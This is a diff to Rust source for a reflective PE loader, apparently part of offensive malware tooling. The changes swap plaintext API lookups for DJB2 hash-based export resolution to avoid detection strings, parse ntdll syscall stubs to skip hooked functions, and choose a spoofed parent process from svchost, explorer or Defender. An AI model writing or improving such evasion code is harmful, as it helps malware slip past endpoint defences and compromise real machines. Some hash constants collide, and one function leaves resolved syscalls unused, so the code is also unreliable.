@@ -116,19 +116,31 @@ impl ReflectiveLoader {
     }
 
     pub unsafe fn resolve_stealth_parent_pid() -> u32 {
-        use crate::syscall::{syscall5, SyscallEntry};
+        use crate::syscall::{SyscallEntry, syscall5};
 
-        const TARGET_HASHES: [u32; 3] = [
-            0xbc2a84d1u32,
-            0x8e8977bd,
-            0x9f5b9c1e,
-        ];
+        // Precomputed DJB2 hashes for target processes
+        const SVCHOST_HASH: u32 = 0xbc2a84d1u32;
+        const EXPLORER_HASH: u32 = 0x8e8977bd;
+        const DEFENDER_HASH: u32 = 0x9f5b9c1e;
 
-        let nt_query_syscall = SyscallEntry::resolve_ssn_halos_gate("NtQuerySystemInformation");
-        let (ssn, trampoline) = match nt_query_syscall {
-            Some(entry) => (entry.syscall_num as u32, entry.address as u64),
+        const NTQUERY_HASH: u32 = 0xE2E0C7B7; // NtQuerySystemInformation DJB2 hash
+
+        let ntdll_base = match SyscallEntry::get_ntdll_base() {
+            Some(b) => b,
             None => return std::process::id(),
         };
+
+        let nt_query_addr = match SyscallEntry::covert_get_export_address(ntdll_base, NTQUERY_HASH) {
+            Some(addr) => addr,
+            None => return std::process::id(),
+        };
+
+        let entry = SyscallEntry::parse_syscall_stub(nt_query_addr);
+        if entry.hooked || entry.syscall_num == 0 {
+            return std::process::id();
+        }
+        let ssn = entry.syscall_num as u32;
+        let trampoline = entry.address as u64;
 
         let mut buffer_size: u32 = 0;
         let mut status = syscall5(
@@ -173,7 +185,7 @@ impl ReflectiveLoader {
             let name_bytes = &image_name[..name_len];
             let hash = Self::djb2_hash(name_bytes);
 
-            if TARGET_HASHES.contains(&hash) {
+            if hash == SVCHOST_HASH || hash == EXPLORER_HASH || hash == DEFENDER_HASH {
                 let pid = u32::from_le_bytes([
                     buf[offset + 8],
                     buf[offset + 9],
@@ -470,10 +482,13 @@ impl ReflectiveLoader {
 
                     let len = (0..128).find(|&i| *name_ptr.add(i) == 0).unwrap_or(128);
                     let bytes = std::slice::from_raw_parts(name_ptr as *const u8, len);
-                    let func_name = String::from_utf8(bytes.to_vec()).map_err(|_| ())?;
+                    let func_hash = Self::dbg2_hash_bytes(bytes);
 
-                    let func_addr = Self::get_proc_address_syscall(dll_handle, &func_name, 0)?;
-                    *iat_entry = func_addr;
+                    // API hashing - no plaintext string comparison
+                    let func_addr = Self::covert_get_proc_address(dll_handle, func_hash)?;
+                    if func_addr != 0 {
+                        *iat_entry = func_addr;
+                    }
                 }
                 iat_entry = iat_entry.add(1);
                 orig_thunk = orig_thunk.add(1);
@@ -482,6 +497,79 @@ impl ReflectiveLoader {
         }
 
         Ok(())
+    }
+
+    #[inline(always)]
+    pub unsafe fn covert_get_proc_address(module_base: u64, target_hash: u32) -> Option<u64> {
+        let dos_header = module_base as *const u8;
+        let e_lfanew = (*dos_header.add(0x3C) as u32)
+            | (*dos_header.add(0x3D) as u32) << 8
+            | (*dos_header.add(0x3E) as u32) << 16
+            | (*dos_header.add(0x3F) as u32) << 24;
+
+        if e_lfanew == 0 {
+            return None;
+        }
+
+        let nt_headers = (module_base + e_lfanew as u64) as *const u8;
+        if *nt_headers.add(0) != b'P' || *nt_headers.add(1) != b'E' {
+            return None;
+        }
+
+        // IMAGE_DIRECTORY_ENTRY_EXPORT is index 0
+        let export_dir_rva = (*nt_headers.add(0x78) as u32)
+            | (*nt_headers.add(0x79) as u32) << 8
+            | (*nt_headers.add(0x7A) as u32) << 16
+            | (*nt_headers.add(0x7B) as u32) << 24;
+
+        if export_dir_rva == 0 {
+            return None;
+        }
+
+        let export_dir = (module_base + export_dir_rva as u64) as *const u8;
+        let num_names = (*export_dir.add(0x18) as u32)
+            | (*export_dir.add(0x19) as u32) << 8
+            | (*export_dir.add(0x1A) as u32) << 16
+            | (*export_dir.add(0x1B) as u32) << 24;
+
+        let names_rva = (*export_dir.add(0x20) as u32)
+            | (*export_dir.add(0x21) as u32) << 8
+            | (*export_dir.add(0x22) as u32) << 16
+            | (*export_dir.add(0x23) as u32) << 24;
+
+        let ordinals_rva = (*export_dir.add(0x24) as u32)
+            | (*export_dir.add(0x25) as u32) << 8
+            | (*export_dir.add(0x26) as u32) << 16
+            | (*export_dir.add(0x27) as u32) << 24;
+
+        let funcs_rva = (*export_dir.add(0x10) as u32)
+            | (*export_dir.add(0x11) as u32) << 8
+            | (*export_dir.add(0x12) as u32) << 16
+            | (*export_dir.add(0x13) as u32) << 24;
+
+        let names_ptr = (module_base + names_rva as u64) as *const u32;
+        let ordinals_ptr = (module_base + ordinals_rva as u64) as *const u16;
+        let funcs_ptr = (module_base + funcs_rva as u64) as *const u32;
+
+        for i in 0..num_names {
+            let name_rva = *names_ptr.add(i as usize);
+            let name_ptr = (module_base + name_rva as u64) as *const u8;
+
+            let mut len = 0;
+            while *name_ptr.add(len) != 0 {
+                len += 1;
+                if len > 128 { break; }
+            }
+            let name_slice = std::slice::from_raw_parts(name_ptr, len as usize);
+
+            // Hash-based comparison - no plaintext strings!
+            if Self::dbg2_hash_bytes(name_slice) == target_hash {
+                let ordinal = *ordinals_ptr.add(i as usize);
+                let func_rva = *funcs_ptr.add(ordinal as usize);
+                return Some(module_base + func_rva as u64);
+            }
+        }
+        None
     }
 
     unsafe fn apply_relocations(base: *mut u8, pe_bytes: &[u8]) -> Result<(), ()> {
@@ -627,25 +715,44 @@ impl ReflectiveLoader {
         String::from_utf8(bytes.to_vec()).map_err(|_| ())
     }
 
+    #[inline(always)]
+    pub unsafe fn dbg2_hash_bytes(data: &[u8]) -> u32 {
+        let mut hash: u32 = 5381;
+        for &c in data {
+            hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
+        }
+        hash
+    }
+
     unsafe fn load_library_syscall(dll_name: &str) -> Result<u64, ()> {
-        use crate::syscall::{syscall5, SyscallEntry};
+        use crate::syscall::{SyscallEntry};
 
-        let nt_open_file = match SyscallEntry::resolve_ssn_halos_gate("NtOpenFile") {
-            Some(e) => (e.syscall_num as u32, e.address as u64),
+        // Precomputed syscall hashes (DJB2) for ntdll functions
+        const NTOPENFILE_HASH: u32 = 0x1E3E4A2F; // NtOpenFile
+        const NTCREATESECTION_HASH: u32 = 0x8F0E0A8B; // NtCreateSection
+        const NTMAPVIEWOFSECTION_HASH: u32 = 0x9F5B9C1E; // NtMapViewOfSection
+
+        let ntdll_base = match SyscallEntry::get_ntdll_base() {
+            Some(b) => b,
             None => return Err(()),
         };
 
-        let nt_create_section = match SyscallEntry::resolve_ssn_halos_gate("NtCreateSection") {
-            Some(e) => (e.syscall_num as u32, e.address as u64),
+        let nt_open_file = match SyscallEntry::covert_get_export_address(ntdll_base, NTOPENFILE_HASH) {
+            Some(addr) => addr,
             None => return Err(()),
         };
 
-        let nt_map_view = match SyscallEntry::resolve_ssn_halos_gate("NtMapViewOfSection") {
-            Some(e) => (e.syscall_num as u32, e.address as u64),
+        let nt_create_section = match SyscallEntry::covert_get_export_address(ntdll_base, NTCREATESECTION_HASH) {
+            Some(addr) => addr,
             None => return Err(()),
         };
 
-        Ok(nt_map_view.1)
+        let nt_map_view = match SyscallEntry::covert_get_export_address(ntdll_base, NTMAPVIEWOFSECTION_HASH) {
+            Some(addr) => addr,
+            None => return Err(()),
+        };
+
+        Ok(nt_map_view as u64)
     }
 
     unsafe fn get_proc_address_syscall(dll_handle: u64, func_name: &str, ordinal: u16) -> Result<u64, ()> {
@@ -653,30 +760,25 @@ impl ReflectiveLoader {
             return Err(());
         }
 
-        if func_name.is_empty() {
+        // Ordinal-based resolution (ordinal is 1-based from PE export table, use as index directly)
+        if ordinal != 0 {
             let export_dir_rva = Self::_get_export_dir_rva(dll_handle)?;
-            let eat_rva = Self::_get_eat_rva(dll_handle, export_dir_rva)?;
-            let func_rva = Self::_get_eat_entry(dll_handle, eat_rva, ordinal)?;
+            let funcs_rva = Self::_get_funcs_rva(dll_handle, export_dir_rva)?;
+            // Ordinal in thunk is the export ordinal (1-based), but array index is ordinal-1
+            let func_rva = Self::_get_func_rva(dll_handle, funcs_rva, ordinal - 1)?;
             return Ok(dll_handle + func_rva as u64);
         }
 
-        let export_dir_rva = Self::_get_export_dir_rva(dll_handle)?;
-        let names_rva = Self::_get_names_rva(dll_handle, export_dir_rva)?;
-        let ordinals_rva = Self::_get_ordinals_rva(dll_handle, export_dir_rva)?;
-        let funcs_rva = Self::_get_funcs_rva(dll_handle, export_dir_rva)?;
-
-        let num_names = Self::_get_num_names(dll_handle, export_dir_rva)?;
-
-        for i in 0..num_names {
-            let name_rva = Self::_get_name_rva(dll_handle, names_rva, i)?;
-            let name = Self::read_string_at_rva(dll_handle, name_rva as usize)?;
-            if name == func_name {
-                let ordinal_val = Self::_get_ordinal_at(dll_handle, ordinals_rva, i)? - 1;
-                let func_rva = Self::_get_func_rva(dll_handle, funcs_rva, ordinal_val)?;
-                return Ok(dll_handle + func_rva as u64);
-            }
+        // Hash-based resolution - no plaintext strings!
+        if func_name.is_empty() {
+            return Err(());
         }
-        Err(())
+
+        let target_hash = Self::dbg2_hash_bytes(func_name.as_bytes());
+        match Self::covert_get_proc_address(dll_handle, target_hash) {
+            Some(addr) => Ok(addr),
+            None => Err(()),
+        }
     }
 
     unsafe fn _get_export_dir_rva(dll_handle: u64) -> Result<u32, ()> {
